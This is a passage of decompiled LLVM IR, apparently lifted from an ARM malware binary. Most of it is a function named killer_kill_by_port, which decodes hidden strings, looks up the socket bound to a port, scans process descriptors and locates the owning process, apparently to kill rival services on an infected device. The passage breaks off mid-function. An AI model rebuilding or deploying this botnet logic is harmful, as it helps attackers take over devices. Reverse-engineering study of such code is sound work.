  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v3_c8e8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8fc, { 1, 0 }
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c97c = load i32, i32* @r4, align 4
  %v6_c97c = load i32, i32* @r5, align 4
  %v9_c97c = load i32, i32* @r6, align 4
  %v12_c97c = load i32, i32* @r7, align 4
  %v15_c97c = load i32, i32* @r8, align 4
  %v18_c97c = load i32, i32* @sb, align 4
  %v21_c97c = load i32, i32* @sl, align 4
  %v24_c97c = load i32, i32* @fp, align 4
  %v27_c97c = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c998 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c998, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9c4 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9c4, i32* @fp, align 4
  %v4_c9d0 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_c9d4 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9d4, i32* @sl, align 4
  %v0_c9d8 = load i32, i32* @r5, align 4
  %v3_c9e4 = bitcast i32* %stack_var_-8777 to i8*
  %v4_c9e4 = call i32 @__GI_memset(i8* %v3_c9e4, i32 %v0_c9d8, i32 4096)
  %v0_c9ec = load i32, i32* @r5, align 4
  %v3_c9f8 = bitcast i32* %stack_var_-4681 to i8*
  %v4_c9f8 = call i32 @__GI_memset(i8* %v3_c9f8, i32 %v0_c9ec, i32 4096)
  %v2_c9fc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_c9fc, i32* @sb, align 4
  %v0_ca00 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca00 = udiv i32 %v0_ca00, 256
  %v1_ca04 = urem i32 %v0_ca00, 256
  store i32 %v1_ca04, i32* @r4, align 4
  %v3_ca14 = trunc i32 %v3_ca00 to i8
  %v4_ca14 = call i32 @util_itoa(i8 %v3_ca14, i32 16, i32 %v2_c9fc)
  %v2_ca1c = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca20 = icmp eq i32 %v2_ca1c, 2
  br i1 %v7_ca20, label %dec_label_pc_cee4, label %dec_label_pc_ca28

dec_label_pc_ca28:                                ; preds = %entry, %dec_label_pc_cee4
  %v1_ca2c = call i32 @table_unlock_val(i32 13)
  %v1_ca34 = call i32 @table_unlock_val(i32 14)
  %v1_ca3c = call i32 @table_unlock_val(i32 15)
  %v1_ca44 = call i32 @table_unlock_val(i32 17)
  %v0_ca48 = load i32, i32* @r5, align 4
  %v2_ca50 = inttoptr i32 %v0_ca48 to i32*
  %v3_ca50 = call i32 @table_retrieve_val(i32 17, i32* %v2_ca50)
  %v0_ca54 = load i32, i32* @r5, align 4
  %v2_ca58 = call i32 @__libc_open(i32 %v3_ca50, i32 %v0_ca54)
  %v7_ca5c = icmp eq i32 %v2_ca58, -1
  store i32 %v2_ca58, i32* @r8, align 4
  br i1 %v7_ca5c, label %bb, label %dec_label_pc_ca6c.preheader

bb:                                               ; preds = %dec_label_pc_ca28
  %v1_ca64 = load i32, i32* @r5, align 4
  store i32 %v1_ca64, i32* @r4, align 4
  br label %dec_label_pc_ce80

dec_label_pc_ca6c.preheader:                      ; preds = %dec_label_pc_ca28
  %v4_ca7856 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca58)
  %v2_ca7c58 = icmp eq i32 %v4_ca7856, 0
  br i1 %v2_ca7c58, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84.lr.ph

dec_label_pc_ca84.lr.ph:                          ; preds = %dec_label_pc_ca6c.preheader
  %v2_cacc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca84.lr.ph, %dec_label_pc_ca6c.backedge
  %v3_ca88 = load i8, i8* %stack_var_-585, align 1
  %v4_ca88 = sext i8 %v3_ca88 to i32
  store i32 %v4_ca88, i32* @r3, align 4
  %v2_ca8c = icmp eq i8 %v3_ca88, 0
  br i1 %v2_ca8c, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ca84
  %v8_ca90 = icmp eq i8 %v3_ca88, 58
  br i1 %v8_ca90, label %.thread8, label %dec_label_pc_caa4

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cabc

bb126:                                            ; preds = %dec_label_pc_ca84
  br label %dec_label_pc_cabc

dec_label_pc_caa4:                                ; preds = %bb125
  %v1_caac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %bb127, %dec_label_pc_caa4
  %v0_caa8 = phi i32 [ %v1_caa8, %bb127 ], [ 0, %dec_label_pc_caa4 ]
  %v1_caa8 = add i32 %v0_caa8, 1
  %v2_caac = add i32 %v1_caa8, %v1_caac.pre
  %v3_caac = inttoptr i32 %v2_caac to i8*
  %v4_caac = load i8, i8* %v3_caac, align 1
  %v6_caac = zext i8 %v4_caac to i32
  store i32 %v6_caac, i32* @r3, align 4
  %v2_cab0 = icmp eq i8 %v4_caac, 0
  br i1 %v2_cab0, label %dec_label_pc_cabc, label %bb127

bb127:                                            ; preds = %dec_label_pc_caa8
  %v8_cab4 = icmp eq i8 %v4_caac, 58
  br i1 %v8_cab4, label %dec_label_pc_cabc, label %dec_label_pc_caa8

dec_label_pc_cabc:                                ; preds = %dec_label_pc_caa8, %bb127, %bb126, %.thread8
  %v1_cae8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_caa8, %bb127 ], [ %v1_caa8, %dec_label_pc_caa8 ]
  %v0_cabc = phi i32 [ %v4_ca88, %.thread8 ], [ %v4_ca88, %bb126 ], [ %v6_caac, %bb127 ], [ %v6_caac, %dec_label_pc_caa8 ]
  %v2_cabc = icmp eq i32 %v0_cabc, 0
  br i1 %v2_cabc, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cac4

dec_label_pc_ca6c.backedge:                       ; preds = %dec_label_pc_cabc, %dec_label_pc_cb8c, %dec_label_pc_cbd8, %dec_label_pc_cb08
  %v0_ca74 = load i32, i32* @r8, align 4
  %v4_ca78 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca74)
  %v2_ca7c = icmp eq i32 %v4_ca78, 0
  br i1 %v2_ca7c, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_cae8, 2
  %v2_cad0 = add i32 %v1_cac8, %v2_cacc
  %v1_cad4 = add i32 %v2_cad0, -545
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v2_cad8 = icmp eq i8 %v3_cad4, 0
  br i1 %v2_cad8, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_cac4
  %v8_cadc = icmp eq i8 %v3_cad4, 32
  br i1 %v8_cadc, label %.thread13, label %dec_label_pc_cae8

.thread13:                                        ; preds = %bb128
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb129:                                            ; preds = %dec_label_pc_cac4
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

dec_label_pc_cae8:                                ; preds = %bb128
  %v0_cae8 = load i32, i32* @r6, align 4
  %v2_cae8 = add i32 %v0_cae8, %v1_cae8
  br label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %bb130, %dec_label_pc_cae8
  %v0_cafc16 = phi i32 [ %v1_cafc, %bb130 ], [ %v1_cac8, %dec_label_pc_cae8 ]
  %v0_cb0018 = phi i32 [ %v1_cb00, %bb130 ], [ %v2_cae8, %dec_label_pc_cae8 ]
  %v1_caf0 = add i32 %v0_cb0018, 3
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf4 = icmp eq i8 %v3_caf0, 0
  br i1 %v2_caf4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_caf0
  %v1_cafc17 = add i32 %v0_cafc16, 1
  store i32 %v1_cafc17, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb130:                                            ; preds = %dec_label_pc_caf0
  %v8_caf8 = icmp eq i8 %v3_caf0, 32
  %v1_cafc = add i32 %v0_cafc16, 1
  store i32 %v1_cafc, i32* @r5, align 4
  %v1_cb00 = add i32 %v0_cb0018, 1
  br i1 %v8_caf8, label %dec_label_pc_cb08, label %dec_label_pc_caf0

dec_label_pc_cb08:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb14 = phi i32 [ %v1_cafc17, %.thread15 ], [ %v1_cac8, %.thread13 ], [ %v1_cac8, %bb129 ], [ %v1_cafc, %bb130 ]
  %v0_cb08 = load i32, i32* @r6, align 4
  %v2_cb08 = add i32 %v0_cb08, %v1_cac8
  store i32 %v2_cb08, i32* @r4, align 4
  %v2_cb14 = add i32 %v1_cb14, %v2_cacc
  store i32 0, i32* @r7, align 4
  %v3_cb1c = add i32 %v2_cb14, -545
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 0, i8* %v4_cb1c, align 1
  %v0_cb20 = load i32, i32* @r4, align 4
  %v1_cb24 = inttoptr i32 %v0_cb20 to i8*
  %v2_cb24 = call i32 @util_strlen(i8* %v1_cb24)
  store i32 %v2_cb24, i32* @r1, align 4
  %v0_cb30 = load i32, i32* @r4, align 4
  %v3_cb34 = inttoptr i32 %v0_cb30 to i8*
  %v4_cb34 = call i32 @util_stristr(i8* %v3_cb34, i32 %v2_cb24, i32 %v2_c9fc)
  %v7_cb38 = icmp eq i32 %v4_cb34, -1
  br i1 %v7_cb38, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb54.preheader

dec_label_pc_cb54.preheader:                      ; preds = %dec_label_pc_cb08
  %v1_cb3c = load i32, i32* @r7, align 4
  %v1_cb40 = load i32, i32* @r6, align 4
  %v2_cb40 = load i32, i32* @r5, align 4
  %v3_cb40 = add i32 %v2_cb40, %v1_cb40
  store i32 %v1_cb3c, i32* @lr, align 4
  %v1_cb5448 = add i32 %v3_cb40, 2
  %v2_cb5449 = inttoptr i32 %v1_cb5448 to i8*
  %v3_cb5450 = load i8, i8* %v2_cb5449, align 1
  %v4_cb5451 = zext i8 %v3_cb5450 to i32
  store i32 %v4_cb5451, i32* @r3, align 4
  %v2_cb5852 = icmp eq i8 %v3_cb5450, 0
  %v1_cb5c54 = add i32 %v2_cb40, 2
  br i1 %v2_cb5852, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb54.preheader, %dec_label_pc_cb54.backedge
  %v0_cb8c83 = phi i32 [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb74.pr = phi i32 [ %v0_cb74.pr70, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_ce94 = phi i32 [ %v0_ce9473, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb5c78 = phi i32 [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v1_cb5c54, %dec_label_pc_cb54.preheader ]
  %v0_cb84 = phi i32 [ %v0_cb54, %dec_label_pc_cb54.backedge ], [ %v3_cb40, %dec_label_pc_cb54.preheader ]
  %v1_cb68 = phi i32 [ %v4_cb54, %dec_label_pc_cb54.backedge ], [ %v4_cb5451, %dec_label_pc_cb54.preheader ]
  %v7_cb64 = icmp eq i32 %v1_cb68, 9
  br i1 %v7_cb64, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb64
  %v8_cb68 = icmp eq i32 %v1_cb68, 32
  br i1 %v8_cb68, label %.thread27, label %dec_label_pc_cb74

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb80

bb132:                                            ; preds = %dec_label_pc_cb64
  br label %dec_label_pc_cb80

dec_label_pc_cb74:                                ; preds = %bb131
  %v7_cb74 = icmp eq i32 %v0_cb74.pr, 1
  br i1 %v7_cb74, label %dec_label_pc_ce94, label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cb74
  %v0_cb8075 = phi i32 [ %v1_ce94, %dec_label_pc_ce94 ], [ %v0_ce94, %dec_label_pc_cb74 ]
  br label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb7c
  %v0_cb80 = phi i32 [ %v0_ce94, %.thread27 ], [ %v0_ce94, %bb132 ], [ %v0_cb8075, %dec_label_pc_cb7c ]
  %v0_cb74.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb7c ]
  %v7_cb88 = icmp sgt i32 %v0_cb80, 6
  br i1 %v7_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb54.backedge

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb54.backedge, %dec_label_pc_cb80, %dec_label_pc_cb54.preheader
  %v1_cbdc = phi i32 [ %v1_cb5c54, %dec_label_pc_cb54.preheader ], [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v0_cb5c78, %dec_label_pc_cb80 ]
  %v0_cb8c = phi i32 [ %v1_cb3c, %dec_label_pc_cb54.preheader ], [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v2_cb8c = icmp eq i32 %v0_cb8c, 0
  br i1 %v2_cb8c, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb8c
  %v2_cba0 = add i32 %v1_cbdc, %v2_cacc
  %v1_cba4 = add i32 %v2_cba0, -545
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v2_cba8 = icmp eq i8 %v3_cba4, 0
  br i1 %v2_cba8, label %dec_label_pc_cbd8, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb98
  %v8_cbac = icmp eq i8 %v3_cba4, 32
  br i1 %v8_cbac, label %dec_label_pc_cbd8, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %bb133
  %v2_cbb4 = add i32 %v1_cbdc, %v1_cb40
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %bb134, %dec_label_pc_cbb4
  %v0_cbc430 = phi i32 [ %v1_cbc4, %bb134 ], [ %v1_cbdc, %dec_label_pc_cbb4 ]
  %v0_cbb8 = phi i32 [ %v1_cbb8, %bb134 ], [ %v2_cbb4, %dec_label_pc_cbb4 ]
  %v1_cbb8 = add i32 %v0_cbb8, 1
  %v2_cbb8 = inttoptr i32 %v1_cbb8 to i8*
  %v3_cbb8 = load i8, i8* %v2_cbb8, align 1
  %v2_cbbc = icmp eq i8 %v3_cbb8, 0
  br i1 %v2_cbbc, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbb8
  %v1_cbc431 = add i32 %v0_cbc430, 1
  br label %dec_label_pc_cbcc

bb134:                                            ; preds = %dec_label_pc_cbb8
  %v8_cbc0 = icmp eq i8 %v3_cbb8, 32
  %v1_cbc4 = add i32 %v0_cbc430, 1
  br i1 %v8_cbc0, label %dec_label_pc_cbcc, label %dec_label_pc_cbb8

dec_label_pc_cbcc:                                ; preds = %bb134, %.thread29
  %v1_cbd4 = phi i32 [ %v1_cbc431, %.thread29 ], [ %v1_cbc4, %bb134 ]
  %v2_cbd4 = add i32 %v1_cbd4, %v2_cacc
  br label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %dec_label_pc_cb98, %bb133, %dec_label_pc_cbcc
  %v2_cbe4 = phi i32 [ %v2_cba0, %dec_label_pc_cb98 ], [ %v2_cba0, %bb133 ], [ %v2_cbd4, %dec_label_pc_cbcc ]
  %v2_cbdc = add i32 %v1_cbdc, %v1_cb40
  store i32 %v2_cbdc, i32* @r4, align 4
  %v3_cbe4 = add i32 %v2_cbe4, -545
  %v4_cbe4 = inttoptr i32 %v3_cbe4 to i8*
  store i8 0, i8* %v4_cbe4, align 1
  %v1_cbe8 = inttoptr i32 %v2_cbdc to i8*
  %v2_cbe8 = call i32 @util_strlen(i8* %v1_cbe8)
  %v8_cbf0 = icmp sgt i32 %v2_cbe8, 15
  br i1 %v8_cbf0, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cbf4

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbd8
  %v0_cbf8 = load i32, i32* @r4, align 4
  %v2_cbfc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbfc, i32* @r0, align 4
  %v2_cc00 = bitcast i32* %stack_var_-56 to i8*
  %v3_cc00 = call i32 @util_strcpy(i8* %v2_cc00, i32 %v0_cbf8)
  br label %dec_label_pc_cc04

dec_label_pc_cc04.loopexit:                       ; preds = %dec_label_pc_ca6c.backedge, %dec_label_pc_ca6c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cc04.loopexit, %dec_label_pc_cbf4
  %v1_cc14.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc04.loopexit ], [ %v2_cc00, %dec_label_pc_cbf4 ]
  %v2_cc10.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc04.loopexit ], [ %v2_cbfc, %dec_label_pc_cbf4 ]
  %v0_cc04 = load i32, i32* @r8, align 4
  %v1_cc08 = call i32 @__GI___libc_close(i32 %v0_cc04)
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14.pre-phi)
  store i32 %v2_cc14, i32* @r4, align 4
  %v2_cc18 = icmp eq i32 %v2_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_cec0, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v3_cc28 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_cc2c = call i32 @__GI_opendir(i32 %v3_cc28)
  store i32 %v1_cc2c, i32* @sb, align 4
  %v2_cc30 = icmp eq i32 %v1_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce60, label %dec_label_pc_cc40.preheader

dec_label_pc_cc40.preheader:                      ; preds = %dec_label_pc_cc20
  store i32 0, i32* @r5, align 4
  %v1_cc4443 = inttoptr i32 %v1_cc2c to i32*
  %v2_cc4444 = call i32 @__GI_readdir(i32* %v1_cc4443)
  %v2_cc4846 = icmp eq i32 %v2_cc4444, 0
  br i1 %v2_cc4846, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc40.loopexit:                       ; preds = %dec_label_pc_cc58, %dec_label_pc_cc68, %dec_label_pc_ccd4
  %v0_cc40 = load i32, i32* @sb, align 4
  %v1_cc44 = inttoptr i32 %v0_cc40 to i32*
  %v2_cc44 = call i32 @__GI_readdir(i32* %v1_cc44)
  %v2_cc48 = icmp eq i32 %v2_cc44, 0
  br i1 %v2_cc48, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc50.preheader:                      ; preds = %dec_label_pc_cc40.preheader, %dec_label_pc_cc40.loopexit
  %v0_cc5891 = phi i32 [ %v2_cc44, %dec_label_pc_cc40.loopexit ], [ %v2_cc4444, %dec_label_pc_cc40.preheader ]
  br label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc50.preheader, %dec_label_pc_ce3c
  %v0_cc70 = phi i32 [ %v0_cc5891, %dec_label_pc_cc50.preheader ], [ %v2_ce48, %dec_label_pc_ce3c ]
  %v0_cc50 = load i32, i32* @r5, align 4
  %v2_cc50 = icmp eq i32 %v0_cc50, 0
  br i1 %v2_cc50, label %dec_label_pc_cc58, label %dec_label_pc_ce54

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc50
  %v1_cc58 = add i32 %v0_cc70, 11
  %v2_cc58 = inttoptr i32 %v1_cc58 to i8*
  %v3_cc58 = load i8, i8* %v2_cc58, align 1
  %v4_cc58 = zext i8 %v3_cc58 to i32
  %v1_cc5c = add nsw i32 %v4_cc58, -48
  %tmp = icmp ugt i32 %v1_cc5c, 9
  br i1 %tmp, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc58
  store i32 %v1_cc58, i32* @r7, align 4
  %v3_cc74 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cc80 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cc74)
  %v2_cc88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cc8c = load i32, i32* @r7, align 4
  %v1_cc90 = load i32, i32* @sl, align 4
  %v2_cc90 = add i32 %v1_cc90, %v2_cc88
  store i32 %v2_cc90, i32* @r0, align 4
  %v2_cc94 = inttoptr i32 %v2_cc90 to i8*
  %v3_cc94 = call i32 @util_strcpy(i8* %v2_cc94, i32 %v0_cc8c)
  %v2_cc9c = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v2_cc9c, i32* @r4, align 4
  %v2_ccac = inttoptr i32 %v0_cca0 to i32*
  %v3_ccac = call i32 @table_retrieve_val(i32 14, i32* %v2_ccac)
  %v0_ccb4 = load i32, i32* @r4, align 4
  %v1_ccb4 = load i32, i32* @sl, align 4
  %v2_ccb4 = add i32 %v1_ccb4, %v0_ccb4
  store i32 %v2_ccb4, i32* @r0, align 4
  %v2_ccb8 = inttoptr i32 %v2_ccb4 to i8*
  %v3_ccb8 = call i32 @util_strcpy(i8* %v2_ccb8, i32 %v3_ccac)
  %v3_ccc8 = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cccc = icmp eq i32 %v3_ccc8, -1
  br i1 %v7_cccc, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cc68
  %v0_ccd4 = load i32, i32* @r5, align 4
  %v2_ccdc = inttoptr i32 %v0_ccd4 to i32*
  %v3_ccdc = call i32 @table_retrieve_val(i32 13, i32* %v2_ccdc)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cce8 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_ccdc)
  %v2_ccf0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_ccf4 = load i32, i32* @r7, align 4
  %v1_ccf8 = load i32, i32* @sl, align 4
  %v2_ccf8 = add i32 %v1_ccf8, %v2_ccf0
  store i32 %v2_ccf8, i32* @r0, align 4
  %v2_ccfc = inttoptr i32 %v2_ccf8 to i8*
  %v3_ccfc = call i32 @util_strcpy(i8* %v2_ccfc, i32 %v0_ccf4)
  %v2_cd04 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd08 = load i32, i32* @r5, align 4
  store i32 %v2_cd04, i32* @r4, align 4
  %v2_cd14 = inttoptr i32 %v0_cd08 to i32*
  %v3_cd14 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd14)
  %v0_cd1c = load i32, i32* @r4, align 4
  %v1_cd1c = load i32, i32* @sl, align 4
  %v2_cd1c = add i32 %v1_cd1c, %v0_cd1c
  store i32 %v2_cd1c, i32* @r0, align 4
  %v2_cd20 = inttoptr i32 %v2_cd1c to i8*
  %v3_cd20 = call i32 @util_strcpy(i8* %v2_cd20, i32 %v3_cd14)
  %v1_cd28 = call i32 @__GI_opendir(i32 %v2_c9d4)
  store i32 %v1_cd28, i32* @r8, align 4
  %v2_cd2c = icmp eq i32 %v1_cd28, 0
  br i1 %v2_cd2c, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cd34.preheader

dec_label_pc_cd34.preheader:                      ; preds = %dec_label_pc_ccd4
  %v1_cd3838 = inttoptr i32 %v1_cd28 to i32*
  %v2_cd3839 = call i32 @__GI_readdir(i32* %v1_cd3838)
  store i32 %v2_cd3839, i32* @r6, align 4
  %v2_cd3c41 = icmp eq i32 %v2_cd3839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c41, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd34.loopexit:                       ; preds = %dec_label_pc_cd54, %dec_label_pc_cdec
  %v0_cd34 = load i32, i32* @r8, align 4
  %v1_cd38 = inttoptr i32 %v0_cd34 to i32*
  %v2_cd38 = call i32 @__GI_readdir(i32* %v1_cd38)
  store i32 %v2_cd38, i32* @r6, align 4
  %v2_cd3c = icmp eq i32 %v2_cd38, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd4cthread-pre-split:                ; preds = %dec_label_pc_cd34.preheader, %dec_label_pc_cd34.loopexit
  %v0_cd4c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd4c

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cd4cthread-pre-split, %dec_label_pc_ce14
  %v0_cd4c = phi i32 [ %v0_cd4c.pr, %dec_label_pc_cd4cthread-pre-split ], [ 1, %dec_label_pc_ce14 ]
  %v2_cd4c = icmp eq i32 %v0_cd4c, 0
  br i1 %v2_cd4c, label %dec_label_pc_cd54, label %dec_label_pc_ce3c

dec_label_pc_cd54:                                ; preds = %dec_label_pc_cd4c
  %v0_cd54 = call i32 @util_zero()
  %v0_cd58 = load i32, i32* @r5, align 4
  %v2_cd60 = inttoptr i32 %v0_cd58 to i32*
  %v3_cd60 = call i32 @table_retrieve_val(i32 13, i32* %v2_cd60)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cd6c = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cd60)
  %v2_cd74 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd78 = load i32, i32* @r7, align 4
  %v1_cd7c = load i32, i32* @sl, align 4
  %v2_cd7c = add i32 %v1_cd7c, %v2_cd74
  store i32 %v2_cd7c, i32* @r0, align 4
  %v2_cd80 = inttoptr i32 %v2_cd7c to i8*
  %v3_cd80 = call i32 @util_strcpy(i8* %v2_cd80, i32 %v0_cd78)
  %v2_cd88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v2_cd88, i32* @r4, align 4
  %v2_cd98 = inttoptr i32 %v0_cd8c to i32*
  %v3_cd98 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd98)
  %v0_cda0 = load i32, i32* @r4, align 4
  %v1_cda0 = load i32, i32* @sl, align 4
  %v2_cda0 = add i32 %v1_cda0, %v0_cda0
  store i32 %v2_cda0, i32* @r0, align 4
  %v2_cda4 = inttoptr i32 %v2_cda0 to i8*
  %v3_cda4 = call i32 @util_strcpy(i8* %v2_cda4, i32 %v3_cd98)
  %v2_cdac = call i32 @util_strlen(i8* %v3_c9f8)
  %v1_cdb4 = load i32, i32* @sl, align 4
  %v2_cdb4 = add i32 %v1_cdb4, %v2_cdac
  store i32 %v2_cdb4, i32* @r0, align 4
  %v2_cdb8 = inttoptr i32 %v2_cdb4 to i8*
  %v3_cdb8 = call i32 @util_strcpy(i8* %v2_cdb8, i32 ptrtoint (i32* @global_var_18d68.69 to i32))
  %v2_cdc0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cdc4 = load i32, i32* @r6, align 4
  %v1_cdc4 = add i32 %v0_cdc4, 11
  %v1_cdc8 = load i32, i32* @sl, align 4
  %v2_cdc8 = add i32 %v1_cdc8, %v2_cdc0
  store i32 %v2_cdc8, i32* @r0, align 4
  %v2_cdcc = inttoptr i32 %v2_cdc8 to i8*
  %v3_cdcc = call i32 @util_strcpy(i8* %v2_cdcc, i32 %v1_cdc4)
  %v3_cddc = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cde0 = icmp eq i32 %v3_cddc, -1
  br i1 %v7_cde0, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cd54
  %v2_cdec = call i32 @util_strlen(i8* %v3_c9e4)
  store i32 %v2_cdec, i32* @r1, align 4
  %v4_ce00 = call i32 @util_stristr(i8* %v3_c9e4, i32 %v2_cdec, i32 %v2_cc10.pre-phi)
  %v7_ce04 = icmp eq i32 %v4_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_ce14

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cdec
  %v0_ce0c = load i32, i32* @r7, align 4
  %v2_ce14 = inttoptr i32 %v0_ce0c to i8*
